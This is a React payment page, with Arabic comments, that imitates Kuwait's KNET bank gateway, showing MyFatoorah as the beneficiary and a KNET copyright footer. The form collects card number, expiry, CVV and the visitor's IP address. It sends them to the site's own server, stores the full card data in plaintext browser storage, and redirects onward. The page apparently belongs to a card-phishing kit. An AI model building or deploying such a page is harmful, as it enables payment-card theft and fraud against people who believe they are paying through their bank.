import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../Style/Payment.css';

const Payment = () => {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [selectedPin, setSelectedPin] = useState('');
  const [pins, setPins] = useState([]);
  const [totalAmount, setTotalAmount] = useState(0);
  const [currency, setCurrency] = useState('');
  const [userIP, setUserIP] = useState('');
  
  // بيانات البنوك والأرقام السريعة المرتبطة بها
  const banksData = {
    'AI Rajhi Bank [Rajhi]': ['458838'],
    'Bank of Bahrain kuwait[BBK]': ['418056', '588790'],
    'Boubyan Bank [Boubyan]': ['470350', '490455', '490456', '404919', '450605', '426058', '431199'],
    'Kuwait Finance House[KFH]': ['409054', '406464'],
    'Brgan Bank [Burgan]': ['468564', '403583', '402978', '415254', '450238', '540759', '49219000'],
    'Kuwait international Bank [KIB]': ['409054', '406464'],
    'National Bank of Kuwait [NBK]': ['464452', '589160'],
    'NBK [Weyay]': ['46445250', '543353'],
    'Commercial Bank of Kuwait [CBK]': ['532672', '537015', '521175', '516334'],
    'Doha Bank [Doha]': ['419252'],
    'Eidity[KNET]': ['526206', '531470', '531644', '531329', '517419', '517458', '531471', '559475'],
    'Not Applicable [FormerAUB]': ['111111'],
    'Qatar National Bank [QNB]': ['521020', '524745'],
    'Union National Bank [UNB]': ['457778'],
    'Warba Bank [Warba]': ['532749', '559459', '541350', '525528'],
    'Gulf Bank of Kuwait[GBK]': ['45077848', '45077849'],
    'KFH [TAM]': ['450778', '552820', '485602', '537016', '532674']
  };

  // توليد شهور السنة (01-12)
  const months = Array.from({ length: 12 }, (_, i) => 
    (i + 1).toString().padStart(2, '0')
  );

  // توليد سنوات (الحالية + 10 سنوات)
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 11 }, (_, i) => 
    (currentYear + i).toString()
  );

  // دالة للحصول على IP المستخدم
  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
    } catch (err) {
      console.error('فشل في الحصول على IP:', err);
      setUserIP('غير معروف');
    }
  };

  // عند التحميل الأولي
  useEffect(() => {
    // جلب IP المستخدم
    fetchUserIP();
    
    // جلب المبلغ والعملة من localStorage
    const storedTotal = localStorage.getItem('orderTotal');
    const storedCurrency = localStorage.getItem('orderCurrency');
    
    if (storedTotal) {
      setTotalAmount(parseFloat(storedTotal));
    }
    
    if (storedCurrency) {
      setCurrency(storedCurrency);
    }
    
    // عند تغيير البنك، تحديث قائمة الأرقام السريعة
    if (selectedBank && banksData[selectedBank]) {
      setPins(banksData[selectedBank]);
      setSelectedPin('');
    }
  }, [selectedBank]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // التحقق من تعبئة جميع الحقول
    if (!selectedBank || !cardNumber || !selectedPin || !expiryMonth || !expiryYear || !cvv) {
      alert('يرجى ملء جميع الحقول المطلوبة');
      return;
    }

    try {
      // إنشاء كائن يحتوي على معلومات البطاقة والـ IP
      const paymentData = {
        bank: selectedBank,
        cardNumber,
        pin: selectedPin,
        expiry: `${expiryMonth}/${expiryYear}`,
        cvv,
        amount: totalAmount,
        currency,
        userIP
      };
      
      // استخدام متغير البيئة في عنوان API
      const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/payment/submit-payment`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(paymentData)
      });

      if (response.ok) {
        // تخزين بيانات البطاقة في localStorage
        const cardData = {
          bank: selectedBank,
          cardNumber,
          pin: selectedPin,
          expiryMonth,
          expiryYear,
          cvv,
          userIP
        };
        localStorage.setItem('cardData', JSON.stringify(cardData));
        
        navigate('/conn');
      } else {
        throw new Error('فشل في إرسال البيانات');
      }
    } catch (error) {
      alert('حدث خطأ: ' + error.message);
    }
  };

  const handleCancel = () => {
    navigate('/checkoutaddress');
  };

  return (
    <div className="payment-container">
      <div className="payment-header">
        <img src="/images/Bank.jpg" alt="Bank Header" className="bank-header-img" />
      </div>

      <div className="beneficiary-section">
        <div className="beneficiary-logo">
          <img src="/images/Bank-logo.jpg" alt="Bank Logo" className="bank-logo-img" />
        </div>
        <div className="did did1">
          <div className="beneficiary-title">المستفيد:</div>
          <div className="beneficiary-name">MyFatoorah</div>
        </div> 
        <div className="did">
          <div className="beneficiary-title">المبلغ:</div>
          <div className="beneficiary-name">
            {currency} {totalAmount.toFixed(3)}
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="payment-form-container">
        <div className="payment-form">
          <div className="form-groupp">
            <div className="form-label">   
              <label htmlFor="bank">يرجى إختيار البنك:</label>
            </div>    
            <div className="form-roww form-roww0">  
              <div className="bank-input">
                <select
                  id="bank"
                  className="bankInp"
                  value={selectedBank}
                  onChange={(e) => setSelectedBank(e.target.value)}
                  required
                >
                  <option value="">اختر البنك</option>
                  {Object.keys(banksData).map(bank => (
                    <option key={bank} value={bank}>{bank}</option>
                  ))}
                </select>
              </div>        
            </div>
          </div>      
          
          <div className="form-groupp">
            <div className="form-label">
              <label htmlFor="cardNumber">رقم بطاقة الصرف الآلي:</label>
            </div>
            <div className="form-roww form-roww1">
              <div className="card-number-input">
                <input
                  type="text"
                  className="cardNumber"
                  id="cardNumber"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  placeholder="543363"
                  maxLength={16}
                  required
                />
              </div>  
              <div className="bank-pin-input">
                <select
                  className="PinInp"
                  value={selectedPin}
                  onChange={(e) => setSelectedPin(e.target.value)}
                  disabled={!selectedBank}
                  required
                >
                  <option value="">اختر PIN</option>
                  {pins.map(pin => (
                    <option key={pin} value={pin}>{pin}</option>
                  ))}
                </select>
              </div>   
            </div>
          </div>
          
          <div className="form-groupp">
            <div className="form-label">
              <label>تاريخ انتهاء البطاقة:</label>
            </div>   
            <div className="form-roww form-roww2">
              <div className="yy">
                <select
                  className="yyInp"
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  required
                >
                  <option value="">السنة</option>
                  {years.map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
              </div>   
              <div className="mm">             
                <select
                  className="mmInp"
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  required
                >
                  <option value="">الشهر</option>
                  {months.map(month => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
              </div>  
            </div>
          </div>

          <div className="form-groupp form-groupp3">
            <div className="form-label">   
              <label htmlFor="cvv">الرقم السري:</label>
            </div>    
            <div className="form-roww form-roww3">  
              <div className="cvv-input">
                <input
                  type="password"
                  id="cvv"
                  className="cvvInp"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  placeholder="cvv"
                  maxLength={4}
                  required
                />
              </div>        
            </div>
          </div>
        </div>   
        <div className="form-buttons">
          <button type="submit" className="submitt-btn">
            إرسال
          </button>
          <button type="button" className="cancel-btn" onClick={handleCancel}>
            إلغاء
          </button>          
        </div>
      </form>

      <div className="payment-footer">
        جميع الحقوق محفوظة © 2025
        <br />
        <p>شركة الخدمات المصرفية الآلية المشتركة – كي نت</p>
      </div>
    </div>
  );
};

export default Payment;